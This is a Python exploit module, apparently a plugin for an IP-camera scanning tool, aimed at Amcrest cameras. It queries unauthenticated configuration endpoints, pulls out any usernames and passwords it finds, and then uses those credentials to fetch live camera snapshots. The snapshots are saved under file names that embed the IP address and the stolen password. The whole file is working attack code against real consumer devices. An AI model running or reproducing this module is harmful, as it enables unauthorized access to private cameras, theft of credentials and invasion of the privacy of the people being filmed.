import requests

from loguru import logger

from .base import POCTemplate


class AmcrestDisclosure(POCTemplate):
    """Amcrest Unauthenticated Information Disclosure

    Certain Amcrest IP cameras expose the /web_caps/webCapsConfig
    endpoint without authentication, leaking device configuration
    including capabilities, firmware info, and potentially sensitive data.
    """

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['amcrest']
        self.product_version = ''
        self.ref = """
        https://www.cvedetails.com/vulnerability-list/vendor_id-19363/Amcrest.html
        """
        self.level = POCTemplate.level.medium
        self.desc = """Amcrest cameras expose configuration data without authentication
        via /web_caps/webCapsConfig endpoint."""

    def verify(self, ip, port=80):
        """Check for unauthenticated access to webCapsConfig"""
        headers = {
            'User-Agent': self.config.user_agent,
            'Connection': 'close',
        }

        # Test unauthenticated endpoints
        test_urls = [
            (f"http://{ip}:{port}/web_caps/webCapsConfig", 'table.General.MachineName'),
            (f"http://{ip}:{port}/current_config/passwd", 'Password'),
            (f"http://{ip}:{port}/current_config/Account1", 'Username'),
        ]

        for url, indicator in test_urls:
            try:
                r = requests.get(
                    url,
                    headers=headers,
                    verify=False,
                    timeout=self.config.timeout,
                    allow_redirects=False
                )
                if r.status_code == 200 and indicator in r.text:
                    # Try to extract credentials if present
                    user = 'disclosed'
                    password = 'disclosed'
                    if 'Username=' in r.text:
                        for line in r.text.split('\n'):
                            if 'Username=' in line:
                                user = line.split('=', 1)[1].strip()
                            elif 'Password=' in line:
                                password = line.split('=', 1)[1].strip()
                    return ip, str(port), self.product, str(user), str(password), self.name
            except Exception as e:
                logger.error(e)

        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        from requests.auth import HTTPDigestAuth
        if user not in ('disclosed', 'N/A') and password not in ('disclosed', 'N/A'):
            img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
            url = f"http://{ip}:{port}/cgi-bin/snapshot.cgi"
            return self._snapshot(url, img_file_name, HTTPDigestAuth(user, password))
        return 0


POCTemplate.register_poc(AmcrestDisclosure)
